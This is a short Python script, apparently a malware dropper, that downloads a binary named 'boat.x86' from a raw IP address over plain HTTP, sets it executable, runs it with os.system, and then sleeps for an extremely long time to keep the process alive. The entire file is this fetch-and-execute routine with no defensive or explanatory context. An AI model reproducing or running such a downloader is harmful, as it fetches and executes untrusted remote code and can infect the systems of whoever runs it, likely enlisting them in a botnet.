import os
import requests
import time

url = 'http://193.35.18.81/boat.x86'
filename = 'boat.x86'

# Download the file
response = requests.get(url)
with open(filename, 'wb') as f:
    f.write(response.content)

# Set permissions on the file
os.chmod(filename, 0o755)

# Run the file with X86 argument
os.system('./boat.x86')
time.sleep(9990909099999)
